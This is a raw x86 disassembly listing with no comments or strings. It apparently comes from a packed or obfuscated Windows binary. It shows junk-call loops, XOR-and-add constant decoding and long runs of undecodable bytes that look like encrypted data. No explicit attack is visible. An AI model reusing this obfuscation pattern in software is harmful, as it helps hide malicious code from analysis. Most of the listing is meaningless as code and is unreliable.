  40e330:	repnz stos DWORD PTR es:[edi],eax
  40e332:	sub    al,0x4b
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	call   0x3f859fdd
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3d3
  40e3cc:	mov    edi,0x78c127d3
  40e3d1:	stos   BYTE PTR es:[edi],al
  40e3d2:	sub    BYTE PTR [eax-0x7d27c8c8],ah
  40e3d8:	hlt    
  40e3d9:	test   al,0x20
  40e3db:	retf   
  40e3dc:	je     0x40e35f
  40e3de:	retf   
  40e3df:	enter  0xe2d0,0xf7
  40e3e3:	xchg   esp,eax
  40e3e4:	rol    DWORD PTR ds:0x19e3e0d4,1
  40e3ea:	lahf   
  40e3eb:	jp     0x40e46c
  40e3ed:	inc    ebx
  40e3ee:	ret    
  40e3ef:	cs addr16 lock shl ebx,1
  40e3f4:	jge    0x40e3e7
  40e3f6:	lea    esi,[edi-0x3f]
  40e3f9:	cli    
  40e3fa:	xor    ah,BYTE PTR [edx+0x3ba1aa82]
  40e400:	inc    ecx
  40e401:	mov    WORD PTR [ecx+0x1e],ds
  40e404:	mov    BYTE PTR [ebp+esi*2-0x7],bl
  40e408:	test   eax,0x67ca5d7
  40e40d:	scas   eax,DWORD PTR es:[edi]
  40e40e:	cmp    ah,BYTE PTR [esi]
  40e410:	mov    eax,ebp
  40e412:	pop    edx
  40e413:	pop    edx
  40e414:	mov    cl,0xb
  40e416:	sbb    al,0x26
  40e418:	icebp  
  40e419:	out    0xd5,al
  40e41b:	cmp    edi,DWORD PTR [esi]
  40e41d:	jecxz  0x40e42c
  40e41f:	pop    edi
  40e420:	cmp    BYTE PTR [ebx+0x4d03f81c],dl
  40e426:	pop    ss
  40e427:	jns    0x40e3c5
  40e429:	jno    0x40e3f3
  40e42b:	xor    edx,DWORD PTR [edi+eax*2-0x6c]
  40e42f:	sub    eax,0x7b5b1704
  40e434:	dec    DWORD PTR [edi-0x64]
  40e437:	and    al,0xce
  40e439:	daa    
  40e43a:	jne    0x40e47c
  40e43c:	mov    eax,0x5401f070
  40e441:	mov    edx,0xd9cb2ac9
  40e446:	sbb    DWORD PTR [ebx+0x54],0x165f13f5
  40e44d:	cmp    cl,BYTE PTR [edx+edx*1+0x3a]
  40e451:	push   es
  40e452:	push   es
  40e453:	fcomp  DWORD PTR [esp+esi*1]
  40e456:	dec    esi
  40e457:	jmp    0x40e49c
  40e459:	inc    ecx
  40e45a:	sbb    eax,0x5b1dcafd
  40e45f:	jb     0x40e4b9
  40e461:	pop    ebp
  40e462:	push   0x1c
  40e464:	xor    al,0x99
  40e466:	js     0x40e4e5
  40e468:	mov    esi,0x1b6e9dc
  40e46d:	mov    eax,ds:0xe02faea5
  40e472:	sub    DWORD PTR [ebp+0x5131403a],esp
  40e478:	jmp    0x7b4ca2eb
  40e47d:	loope  0x40e4ee
  40e47f:	xchg   ebx,eax
  40e480:	add    BYTE PTR [edi-0x27],ah
  40e483:	lds    ecx,FWORD PTR [edi+0x4824d60f]
  40e489:	sbb    edi,0x5a84c6b9
  40e48f:	push   edi
  40e490:	out    0x94,al
  40e492:	push   ebp
  40e493:	mul    edx
  40e495:	pop    ecx
  40e496:	xchg   ecx,eax
  40e497:	scas   al,BYTE PTR es:[edi]
  40e498:	inc    esi
  40e499:	test   DWORD PTR [ebp+ebp*2+0x69],eax
  40e49d:	dec    ebp
  40e49e:	pand   mm5,QWORD PTR [eax+0x63]
  40e4a2:	jle    0x40e433
  40e4a4:	dec    eax
  40e4a5:	stc    
  40e4a6:	mov    ds:0xe7748ba1,eax
  40e4ab:	inc    ebx
  40e4ac:	lahf   
  40e4ad:	adc    BYTE PTR [edx+eiz*2+0x38fecc5d],ch
  40e4b4:	sbb    BYTE PTR [ecx],0xbd
  40e4b7:	imul   edx,DWORD PTR [esi],0x1f
  40e4ba:	pop    esi
  40e4bb:	jl     0x40e514
  40e4bd:	pop    esp
  40e4be:	das    
  40e4bf:	int    0xd0
  40e4c1:	dec    esi
  40e4c2:	imul   eax,DWORD PTR [edi],0x73fa6c9a
  40e4c8:	dec    edx
  40e4c9:	pop    esp
  40e4ca:	js     0x40e533
  40e4cc:	xchg   edx,eax
  40e4cd:	aaa    
  40e4ce:	pop    ss
  40e4cf:	pop    edx
  40e4d0:	data16 cmp BYTE PTR [edi-0x78],dl
  40e4d4:	and    BYTE PTR [esi-0x21],ch
  40e4d7:	fisttp QWORD PTR [ebp-0x2]
  40e4da:	sub    cl,BYTE PTR [edi]
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43383305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0xb4bc9328
  40e5c1:	lock sub ecx,edi
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e58d
  40e5cc:	dec    ecx
  40e5cd:	mov    ebp,esi
  40e5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d0:	jne    0x40e63c
  40e5d2:	daa    
  40e5d3:	lea    edi,[edx+0x78]
  40e5d6:	cmp    al,0x6b
  40e5d8:	dec    ebp
  40e5d9:	xchg   ebx,eax
  40e5da:	mov    bh,0xd5
  40e5dc:	xchg   ebp,eax
  40e5dd:	push   0x42
  40e5df:	dec    ecx
  40e5e0:	push   esp
  40e5e1:	aaa    
  40e5e2:	adc    eax,0x2d1559cb
  40e5e7:	cmp    eax,0xe991cbcb
  40e5ec:	adc    eax,0x9e63c16c
  40e5f1:	leave  
  40e5f2:	rcr    ebp,0x61
  40e5f5:	inc    edx
  40e5f6:	stos   BYTE PTR es:[edi],al
  40e5f7:	out    0x5f,eax
  40e5f9:	iret   
  40e5fa:	mov    esp,0xa2107975
  40e5ff:	inc    ecx
  40e600:	or     eax,0xa17e2f77
  40e605:	jmp    0x314e00a5
  40e60a:	shr    DWORD PTR [esi-0x78fc84fa],cl
  40e610:	lahf   
  40e611:	cli    
  40e612:	fstp   TBYTE PTR [ecx+0x5f]
  40e615:	add    bl,BYTE PTR [ebx+0x7]
  40e618:	icebp  
  40e619:	push   ebp
  40e61a:	or     BYTE PTR [ebp+0x50],dl
  40e61d:	and    edx,DWORD PTR [esi-0x80]
  40e620:	retf   0xe769
  40e623:	aam    0x39
  40e625:	xchg   ebp,eax
  40e626:	lods   eax,DWORD PTR ds:[esi]
  40e627:	xchg   ebp,eax
  40e628:	xor    al,0xca
  40e62a:	cmp    eax,0x97e74fc9
  40e62f:	gs mov bl,0xaf
  40e632:	or     eax,0xb70d1a9f
  40e637:	(bad)  
  40e63a:	call   0x1ffe:0xb6c90507
  40e641:	clc    
  40e642:	add    al,BYTE PTR [edi-0x4673eb20]
  40e648:	jns    0x40e636
  40e64a:	xchg   edx,eax
  40e64b:	cmc    
  40e64c:	xchg   BYTE PTR [eax-0x17],dl
  40e64f:	outs   dx,DWORD PTR ds:[esi]
  40e651:	dec    ebp
  40e652:	pop    ebp
  40e653:	or     BYTE PTR [ebp-0x1d5bdf16],ch
  40e659:	or     eax,0xac1080d2
  40e65e:	jae    0x40e5f6
  40e660:	xor    edi,esp
  40e662:	pop    edi
  40e663:	jmp    0x40e60d
  40e665:	mov    ebp,0x1e1f0e88
  40e66a:	xor    DWORD PTR [ecx-0x1],edi
  40e66d:	and    al,ah
  40e66f:	xlat   BYTE PTR ds:[ebx]
  40e670:	mov    ah,0xce
  40e672:	sahf   
  40e673:	xor    ebx,DWORD PTR [edx]
  40e675:	xchg   ecx,eax
  40e676:	leave  
  40e677:	dec    edx
  40e678:	mov    edx,DWORD PTR [edi-0x7a]
  40e67b:	mov    ah,0x6c
  40e67d:	(bad)  
  40e67f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e680:	sti    
  40e681:	mov    BYTE PTR [ebx],cl
  40e683:	sbb    esi,ebx
  40e685:	in     al,0xa0
  40e687:	jle    0x40e666
  40e689:	push   es
  40e68a:	add    al,0x91
  40e68c:	ins    DWORD PTR es:[edi],dx
  40e68d:	outs   dx,DWORD PTR ds:[esi]
  40e68e:	cdq    
  40e68f:	and    dl,ch
  40e691:	jge    0x40e6bb
  40e693:	sbb    bh,BYTE PTR [edx+0x38]
  40e696:	addr16 dec edi
  40e698:	mov    ds:0x3679b908,al
  40e69d:	ret    0xd4ba
  40e6a0:	pop    ebx
  40e6a1:	pop    ecx
  40e6a2:	push   0x65
  40e6a4:	ror    DWORD PTR [eax-0x25f1dc62],0xea
  40e6ab:	mov    ds:0x2de59b36,eax
  40e6b0:	ret    
  40e6b1:	inc    eax
  40e6b2:	jmp    0xc34dec11
  40e6b7:	cmp    dl,ch
  40e6b9:	shl    BYTE PTR [ecx-0x54458c1a],0xdd
  40e6c0:	ficomp DWORD PTR es:[eax+ecx*8]
  40e6c4:	ins    DWORD PTR es:[edi],dx
  40e6c5:	scas   eax,DWORD PTR es:[edi]
  40e6c6:	gs stc 
  40e6c8:	xrelease xchg DWORD PTR [ebx-0x2c],eax
  40e6cc:	aad    0xb6
  40e6ce:	imul   esi,DWORD PTR [ebx+0x65],0xaf574753
  40e6d5:	inc    esp
  40e6d6:	pop    ss
  40e6d7:	cld    
  40e6d8:	cs push cs
  40e6da:	or     BYTE PTR [ebx+0x4d8bfc45],0x10
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x9da630a1
  40e707:	jb     0x40e6dd
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	and    eax,0xc05572c4
  40e716:	out    dx,al
  40e717:	stos   BYTE PTR es:[edi],al
  40e718:	lahf   
  40e719:	or     BYTE PTR [ebp-0x36],cl
  40e71c:	les    esp,FWORD PTR [edx+0x6e]
  40e71f:	dec    esp
  40e720:	lock jecxz 0x40e709
  40e723:	fidivr WORD PTR ds:[ebx]
  40e726:	cmp    dl,al
  40e728:	gs pusha 
  40e72a:	mov    bl,0x1d
  40e72c:	jg     0x40e775
  40e72e:	ins    DWORD PTR es:[edi],dx
  40e72f:	lods   eax,DWORD PTR ds:[esi]
  40e730:	cs (bad) 
  40e732:	daa    
  40e733:	(bad)  
  40e734:	in     al,0xf3
  40e736:	jp     0x40e7b1
  40e738:	test   al,0xac
  40e73a:	loop   0x40e77e
  40e73c:	sbb    eax,0xc608dc46
  40e741:	not    DWORD PTR [eax+0x7898c503]
  40e747:	jno    0x40e77d
  40e749:	mov    ch,0x86
  40e74b:	iret   
  40e74c:	or     DWORD PTR [eax+0x6f],edi
  40e74f:	xlat   BYTE PTR ds:[ebx]
  40e750:	cli    
  40e751:	loope  0x40e7aa
  40e753:	(bad)  
  40e754:	es add al,0x94
  40e757:	test   bl,dl
  40e759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75a:	lods   al,BYTE PTR ds:[esi]
  40e75b:	jmp    0x6f8ccef8
  40e760:	in     al,0xcb
  40e762:	and    al,0xa
  40e764:	sti    
  40e765:	cmp    al,0x36
  40e767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e768:	inc    eax
  40e769:	std    
  40e76a:	mov    cl,0xc6
  40e76c:	fisubr WORD PTR [ecx]
  40e76e:	add    BYTE PTR [ebx-0x2948c92],bl
  40e774:	imul   ebp,DWORD PTR [esp+ebx*1-0x35ec28d0],0x96321ff8
  40e77f:	(bad)  
  40e780:	call   0x9383871c
  40e785:	sub    eax,0x64b88f28
  40e78a:	frstor [ebx+0x7f]
  40e78d:	rcl    ecx,1
  40e78f:	mov    ebx,0x2c9c3af8
  40e794:	daa    
  40e795:	cmp    edi,eax
  40e797:	push   ss
  40e798:	xchg   edx,eax
  40e799:	cmp    al,0xaa
  40e79b:	adc    eax,0x759c1c43
  40e7a0:	adc    DWORD PTR [esi-0xcd5e00e],eax
  40e7a6:	dec    ecx
  40e7a7:	addr16 popa 
  40e7a9:	xchg   edx,eax
  40e7aa:	call   FWORD PTR [esi-0x78775ebc]
  40e7b0:	mov    ebp,0xed4b7e45
  40e7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b6:	int3   
  40e7b7:	jp     0x40e789
  40e7b9:	push   0x6a
  40e7bb:	lock les ecx,FWORD PTR [ecx-0x1e]
  40e7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7c0:	hlt    
  40e7c1:	xor    DWORD PTR [ebp+edi*8+0x5],esi
  40e7c5:	mov    ds:0x61627e70,al
  40e7ca:	jae    0x40e7a1
  40e7cc:	lock aam 0xe1
  40e7cf:	popa   
  40e7d0:	jmp    0x40e7b0
  40e7d2:	mov    esp,0x33d09226
  40e7d7:	fsubr  DWORD PTR [ebx]
  40e7d9:	jb     0x40e773
  40e7db:	pop    eax
  40e7dc:	jbe    0x40e7f5
  40e7de:	fisubr DWORD PTR [ecx]
  40e7e0:	inc    ebp
  40e7e1:	mov    edi,0x4e4827f6
  40e7e6:	sub    BYTE PTR [edi+0x34],cl
  40e7e9:	sub    DWORD PTR ds:0x64f9fd52,esp
  40e7ef:	aaa    
  40e7f0:	ins    BYTE PTR es:[edi],dx
  40e7f1:	inc    esp
  40e7f2:	aas    
  40e7f3:	(bad)  
  40e7f4:	imul   ebx,eax,0x2659ee2b
  40e7fa:	jmp    0xeacb4597
  40e7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e800:	sahf   
  40e801:	or     ebx,0x6a
  40e804:	xor    DWORD PTR [edx+esi*4],esi
  40e807:	pop    esi
  40e808:	lds    ebp,FWORD PTR [edx-0x8]
  40e80b:	jmp    0x40e86a
  40e80d:	add    esi,DWORD PTR [eax+0x54]
  40e810:	dec    edx
  40e811:	data16 cmc 
  40e813:	(bad)  
  40e814:	jle    0x40e88a
  40e816:	jle    0x40e872
  40e818:	clc    
  40e819:	xchg   esp,eax
  40e81a:	icebp  
  40e81b:	rcr    BYTE PTR [edx],0xf8
  40e81e:	cmp    DWORD PTR [edx+0x3c62a3eb],ecx
  40e824:	inc    ecx
  40e825:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0xd0103a68,al
  40ea30:	or     bh,dh
  40ea32:	and    ch,bh
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	xchg   ecx,eax
  40ea3c:	inc    ecx
  40ea3d:	push   0x6a5c8f9f
  40ea42:	and    al,0x96
  40ea44:	scas   al,BYTE PTR es:[edi]
  40ea45:	add    DWORD PTR [ebx-0x4c],edi
  40ea48:	repnz pop esi
  40ea4a:	pop    edx
  40ea4b:	pop    edi
  40ea4c:	addr16 xor al,0xca
  40ea4f:	push   ss
  40ea50:	push   edi
  40ea51:	loopne 0x40ea66
  40ea53:	(bad)  
  40ea54:	fldenv [esi-0x7907c02e]
  40ea5a:	fadd   QWORD PTR [eax+0x2a]
  40ea5d:	push   0x6fa6365
  40ea62:	popa   
  40ea63:	mov    dh,0x7e
  40ea65:	sbb    al,0x81
  40ea67:	push   cs
  40ea68:	dec    DWORD PTR [edx-0x9ac7176]
  40ea6e:	std    
  40ea6f:	xor    ebx,DWORD PTR [eax+0x44]
  40ea72:	xchg   edx,eax
  40ea73:	arpl   WORD PTR [esi],bx
  40ea75:	and    dh,BYTE PTR [edx+ebp*1]
  40ea78:	mov    bh,0x83
  40ea7a:	mov    esp,DWORD PTR [edi-0x14]
  40ea7d:	movhps QWORD PTR [edx+0x409300c0],xmm4
  40ea84:	xchg   esi,eax
  40ea85:	test   BYTE PTR [eax],cl
  40ea87:	enter  0xc744,0xb3
  40ea8b:	mov    esi,DWORD PTR ds:0x5f272084
  40ea91:	imul   edi,DWORD PTR [ebx+0x5a],0xffffff9d
  40ea95:	inc    esi
  40ea96:	pop    edx
  40ea97:	lods   al,BYTE PTR ds:[esi]
  40ea98:	pushf  
  40ea99:	or     edi,0x98adc6fe
  40ea9f:	mov    al,0x2b
  40eaa1:	dec    edx
  40eaa2:	mov    ecx,0xaca3a724
  40eaa7:	repz xchg ebx,eax
  40eaa9:	pop    esp
  40eaaa:	aas    
  40eaab:	xchg   esp,eax
  40eaac:	les    ebx,FWORD PTR [edi-0x7]
  40eaaf:	dec    edx
  40eab0:	dec    edx
  40eab1:	retf   
  40eab2:	out    0x99,al
  40eab4:	repz push edi
  40eab6:	imul   edi,DWORD PTR [ebp-0x64],0xffffffdf
  40eaba:	mov    DWORD PTR ds:0xba7adffe,ebx
  40eac0:	push   ebx
  40eac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac2:	iret   
  40eac3:	data16 sti 
  40eac5:	cmp    esi,ecx
  40eac7:	imul   esi,DWORD PTR [eax],0x8d3615b9
  40eacd:	iret   
  40eace:	add    dh,BYTE PTR [edi+0x0]
  40ead1:	cli    
  40ead2:	pop    edi
  40ead3:	cli    
  40ead4:	out    dx,eax
  40ead5:	aaa    
  40ead6:	pop    eax
  40ead7:	dec    esp
  40ead8:	sub    al,BYTE PTR ds:0x55196412
  40eade:	out    dx,eax
  40eadf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eae0:	sahf   
  40eae1:	pop    esp
  40eae2:	xchg   ebp,eax
  40eae3:	in     al,0xf2
  40eae5:	test   eax,0xa9899c0f
  40eaea:	mov    eax,0xbe94a5b0
  40eaef:	mov    es,edi
  40eaf1:	nop
  40eaf2:	and    BYTE PTR [ebp+0x43],dl
  40eaf5:	gs ret 0xbb8e
  40eaf9:	push   eax
  40eafa:	push   es
  40eafb:	in     eax,0x70
  40eafd:	jne    0x40eaec
  40eaff:	add    al,0xd1
  40eb01:	and    al,0xf6
  40eb03:	mov    eax,0xf2c36057
  40eb08:	jp     0x40eaa5
  40eb0a:	pop    es
  40eb0b:	ja     0x40eb50
  40eb0d:	scas   al,BYTE PTR es:[edi]
  40eb0e:	fnstcw WORD PTR [eax]
  40eb10:	sub    eax,DWORD PTR [ebp+eiz*4+0x54c40326]
  40eb17:	cmp    al,0x1c
  40eb19:	or     bh,BYTE PTR [edx+0x5f99df08]
  40eb1f:	adc    al,0x4
  40eb21:	fwait
  40eb22:	mov    eax,0xcd6a46fc
  40eb27:	inc    esp
  40eb28:	jmp    0x84987fe5
  40eb2d:	sbb    edi,0x6dc39c4f
  40eb33:	and    al,0x46
  40eb35:	mov    ecx,es
  40eb37:	mov    ch,0xb7
  40eb39:	add    eax,0xbb395a5c
  40eb3e:	fwait
  40eb3f:	test   eax,0x5d3ab8d7
  40eb44:	std    
  40eb45:	in     eax,0xbf
  40eb47:	mov    bh,0x63
  40eb49:	js     0x40eb68
  40eb4b:	sbb    eax,0x98283296
  40eb50:	repnz into 
  40eb52:	pmaxub mm4,QWORD PTR [eax-0x49]
  40eb56:	in     al,dx
  40eb57:	fnstcw WORD PTR [ecx+0x51]
  40eb5a:	mov    al,ds:0xad70335e
  40eb5f:	in     al,0x5e
  40eb61:	(bad)  
  40eb64:	push   es
  40eb65:	lock (bad) 
  40eb68:	mov    ah,0x40
  40eb6a:	sub    al,0xd8
  40eb6c:	stc    
  40eb6d:	or     eax,0x38985eb3
  40eb72:	ret    
  40eb73:	sub    BYTE PTR [edi+edi*2-0x59213f9b],cl
  40eb7a:	pop    es
  40eb7b:	pop    edx
  40eb7c:	pop    es
  40eb7d:	outs   dx,DWORD PTR ds:[esi]
  40eb7e:	daa    
  40eb7f:	xchg   edx,eax
  40eb80:	arpl   WORD PTR [edi+0x336f955c],bx
  40eb86:	sbb    al,0xb9
  40eb88:	dec    esi
  40eb89:	mov    ch,BYTE PTR [eax]
  40eb8b:	or     eax,DWORD PTR [eax+eax*2-0x69]
  40eb8f:	mov    edx,0x95e53f96
  40eb94:	nop
  40eb95:	pusha  
  40eb96:	or     al,0x8a
  40eb98:	pop    ebx
  40eb99:	mov    edi,0x59bf4da3
  40eb9e:	repnz pop es
  40eba0:	(bad)  
  40eba1:	aam    0x9c
  40eba3:	xchg   ebp,eax
  40eba4:	jge    0x40ebc2
  40eba6:	and    DWORD PTR [edi-0x8],edi
  40eba9:	sbb    al,0xda
  40ebab:	mov    DWORD PTR [eax+0x73d8e229],ebp
  40ebb1:	mov    esi,0xfbfaa84f
  40ebb6:	xor    al,0xe8
  40ebb8:	add    al,0xb2
  40ebba:	mov    esp,0x2998d36d
  40ebbf:	jne    0x40eb4b
  40ebc1:	in     al,0x68
  40ebc3:	pop    ebp
  40ebc4:	(bad)  
  40ebc5:	shr    BYTE PTR [edx],1
  40ebc7:	mov    esi,0xb1540cef
  40ebcc:	mov    ebx,0x19b59e17
  40ebd1:	ins    DWORD PTR es:[edi],dx
  40ebd2:	aaa    
  40ebd3:	jae    0x40ec24
  40ebd5:	daa    
  40ebd6:	mov    ebx,0x6d8a6ac9
  40ebdb:	out    0x31,al
  40ebdd:	mov    esp,0x1edefa82
  40ebe2:	pop    esi
